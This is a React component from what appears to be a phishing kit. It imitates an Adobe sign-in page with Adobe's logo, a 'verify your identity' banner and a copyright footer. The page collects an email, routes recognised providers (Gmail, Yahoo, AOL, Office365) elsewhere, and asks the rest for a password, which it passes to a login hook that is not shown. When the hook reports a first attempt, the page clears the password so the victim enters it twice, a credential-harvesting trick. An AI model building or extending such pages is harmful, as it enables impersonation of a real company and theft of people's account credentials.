import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface OthersLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onEmailSubmit?: (email: string) => boolean | Promise<boolean>;
  onBack?: () => void;
}

const bgImages = [
  'https://t4.ftcdn.net/jpg/16/63/26/51/360_F_1663265139_4lYMaxRozez8ZWaEKRGeOnDwHJHkmnvZ.jpg',
  'https://img.freepik.com/free-vector/abstract-classic-blue-background_23-2148434987.jpg?semt=ais_rp_progressive&w=740&q=80',
  'https://static.vecteezy.com/system/resources/thumbnails/013/006/541/small/wave-of-the-many-colored-lines-abstract-wavy-stripes-background-isolated-free-vector.jpg',
  'https://img.freepik.com/free-vector/abstract-wave-line-background-vector-illustration_460848-11121.jpg?semt=ais_user_personalization&w=740&q=80',
  'https://img.freepik.com/free-vector/gradient-blue-background-modern-design-geometric_343694-3809.jpg?semt=ais_hybrid&w=740&q=80',
  'https://t4.ftcdn.net/jpg/02/42/03/25/360_F_242032542_DMW2J5F2t1P2mTOF3xRpxpOUwqSueGuh.jpg',
  'https://media.freestocktextures.com/cache/38/3c/383c0f90fdd90dac685de27ebdc40afd.jpg',
];

const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
  onLoginSuccess,
  onLoginError,
  onEmailSubmit,
  onBack,
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);
  const [nextLoading, setNextLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [bgIndex, setBgIndex] = useState(() => Math.floor(Math.random() * bgImages.length));

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setBgIndex(prev => {
        let next = Math.floor(Math.random() * bgImages.length);
        let attempts = 0;
        while (next === prev && bgImages.length > 1 && attempts < 10) {
          next = Math.floor(Math.random() * bgImages.length);
          attempts++;
        }
        return next;
      });
    }, 6000);
    return () => clearInterval(interval);
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setNextLoading(true);
    await new Promise(resolve => setTimeout(resolve, 800));

    // Check if the email domain is a recognized provider (may be async for Office365 detection)
    if (onEmailSubmit) {
      const result = onEmailSubmit(email);
      const handled = result instanceof Promise ? await result : result;
      if (handled) {
        // onEmailSubmit handled navigation (yahoo/aol/gmail/office365 detected)
        return;
      }
    }

    // Unrecognized domain — show password step
    setShowPasswordStep(true);
    setNextLoading(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 1200));
    const result = await handleFormSubmit(
      { preventDefault: () => {} } as React.FormEvent,
      { email, password, provider: 'Others' }
    );
    if (result?.isFirstAttempt) {
      setPassword('');
    }
    setSubmitting(false);
  };

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
        <Spinner size="lg" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      {/* Desktop: rotating background images, Mobile: white background */}
      <style>{`
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .others-page {
          background: #f5f5f5;
        }
        @media screen and (min-width: 510px) {
          .others-page {
            background-image: url(${bgImages[bgIndex]});
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            transition: background-image 0.8s ease-in-out;
          }
        }
      `}</style>

      <div className="others-page min-h-screen flex items-center justify-center p-4">
        <div
          className="w-full bg-white"
          style={{
            maxWidth: '440px',
            borderRadius: '12px',
            padding: '40px 32px',
            boxShadow: '0 4px 24px rgba(0,0,0,.12)',
          }}
        >
          {/* Adobe Logo */}
          <div className="flex items-center gap-2 mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="26" viewBox="0 0 30 26">
              <path d="M11.5 0H0v26l11.5-26zm7 0H30v26L18.5 0zM15 9.6L21.1 26h-4.5l-1.8-4.7H10l5-11.7z" fill="#EB1000"/>
            </svg>
            <span style={{ fontSize: '18px', fontWeight: 700, color: '#2c2c2c', letterSpacing: '-0.5px' }}>Adobe</span>
          </div>

          {/* Info Banner */}
          <div
            style={{
              background: '#0265DC',
              color: '#fff',
              padding: '10px 16px',
              borderRadius: '6px',
              fontSize: '13px',
              marginBottom: '24px',
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
            }}
          >
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <circle cx="8" cy="8" r="8" fill="white" fillOpacity="0.3"/>
              <text x="8" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold">i</text>
            </svg>
            For your protection, please verify your identity.
          </div>

          {/* Heading */}
          <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#2c2c2c', marginBottom: '4px' }}>
            {!showPasswordStep ? 'Sign in' : 'Enter your password'}
          </h1>
          {!showPasswordStep && (
            <p style={{ fontSize: '14px', color: '#6e6e6e', marginBottom: '20px' }}>
              Enter your email address to continue.
            </p>
          )}

          {/* Show email chip when on password step */}
          {showPasswordStep && (
            <div
              style={{
                fontSize: '14px',
                color: '#2c2c2c',
                background: '#f5f5f5',
                padding: '8px 14px',
                borderRadius: '20px',
                marginBottom: '20px',
                display: 'inline-block',
                maxWidth: '100%',
                overflow: 'hidden',
                textOverflow: 'ellipsis',
                whiteSpace: 'nowrap',
              }}
            >
              {email}
            </div>
          )}

          {/* Error Message */}
          {errorMessage && !isLoading && (
            <div
              style={{
                margin: '0 0 16px',
                padding: '10px 14px',
                borderRadius: '4px',
                fontSize: '13px',
                color: '#c9252d',
                background: '#fff0f0',
                border: '1px solid #ffc0c0',
              }}
            >
              {errorMessage}
            </div>
          )}

          {!showPasswordStep ? (
            /* Email Step */
            <form onSubmit={handleNext}>
              <div style={{ marginBottom: '16px' }}>
                <label
                  style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#4b4b4b',
                    marginBottom: '6px',
                    fontWeight: 500,
                  }}
                >
                  Email address
                </label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoFocus
                  required
                  style={{
                    width: '100%',
                    boxSizing: 'border-box',
                    padding: '10px 12px',
                    border: '2px solid #d3d3d3',
                    borderRadius: '4px',
                    fontSize: '16px',
                    color: '#323232',
                    outline: 'none',
                    transition: 'border-color 0.2s',
                  }}
                  onFocus={(e) => (e.target.style.borderColor = '#1473e6')}
                  onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
                />
              </div>
              <button
                type="submit"
                disabled={!email || nextLoading}
                style={{
                  width: '100%',
                  padding: '12px',
                  backgroundColor: !email || nextLoading ? '#b8b8b8' : '#1473e6',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '20px',
                  fontSize: '15px',
                  fontWeight: 600,
                  cursor: !email || nextLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  minHeight: '44px',
                }}
              >
                {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Continue'}
              </button>
            </form>
          ) : (
            /* Password Step */
            <form onSubmit={handleSubmit}>
              <div style={{ marginBottom: '16px' }}>
                <label
                  style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#4b4b4b',
                    marginBottom: '6px',
                    fontWeight: 500,
                  }}
                >
                  Password
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoFocus
                  required
                  style={{
                    width: '100%',
                    boxSizing: 'border-box',
                    padding: '10px 12px',
                    border: '2px solid #d3d3d3',
                    borderRadius: '4px',
                    fontSize: '16px',
                    color: '#323232',
                    outline: 'none',
                    transition: 'border-color 0.2s',
                  }}
                  onFocus={(e) => (e.target.style.borderColor = '#1473e6')}
                  onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
                />
              </div>
              <button
                type="submit"
                disabled={submitting || isLoading || !password}
                style={{
                  width: '100%',
                  padding: '12px',
                  backgroundColor: submitting || isLoading || !password ? '#b8b8b8' : '#1473e6',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '20px',
                  fontSize: '15px',
                  fontWeight: 600,
                  cursor: submitting || isLoading || !password ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  minHeight: '44px',
                }}
              >
                {submitting || isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Continue'}
              </button>
            </form>
          )}

          {/* Back link */}
          {onBack && (
            <div style={{ marginTop: '20px', textAlign: 'center' }}>
              <button
                onClick={onBack}
                type="button"
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#1473e6',
                  fontSize: '14px',
                  cursor: 'pointer',
                  textDecoration: 'none',
                  fontWeight: 500,
                }}
              >
                Back to sign in
              </button>
            </div>
          )}

          {/* Footer */}
          <div style={{ marginTop: '32px', paddingTop: '16px', borderTop: '1px solid #eaeaea' }}>
            <p style={{ fontSize: '11px', color: '#959595', lineHeight: 1.5, margin: 0 }}>
              Copyright © 2025 Adobe. All rights reserved.{' '}
              <a href="https://www.adobe.com/go/terms_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>
                Terms of Use
              </a>{' | '}
              <a href="https://www.adobe.com/go/privacy_policy_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>
                Privacy
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OthersLoginPage;
